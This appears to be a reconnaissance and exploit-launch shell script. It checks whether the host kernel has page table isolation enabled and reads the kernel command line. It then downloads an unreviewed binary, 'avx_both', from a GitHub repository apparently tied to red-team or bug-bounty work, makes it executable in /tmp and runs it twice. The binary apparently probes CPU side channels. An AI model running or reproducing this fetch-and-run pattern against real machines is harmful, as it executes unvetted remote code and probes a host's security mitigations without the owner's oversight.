#!/bin/sh
echo "pti_flag: $(grep -c ' pti' /proc/cpuinfo)"
echo "cmdline: $(cat /proc/cmdline)"
cd /tmp/rt
[ -x avx_both ] || { curl -sL -m 90 -o avx_both https://raw.githubusercontent.com/rpkl122/bbh-rt/main/avx_both; chmod +x avx_both; }
echo "--avx_both run1--"; ./avx_both 3 2>&1 | head -14
echo "--avx_both run2--"; ./avx_both 3 2>&1 | head -14
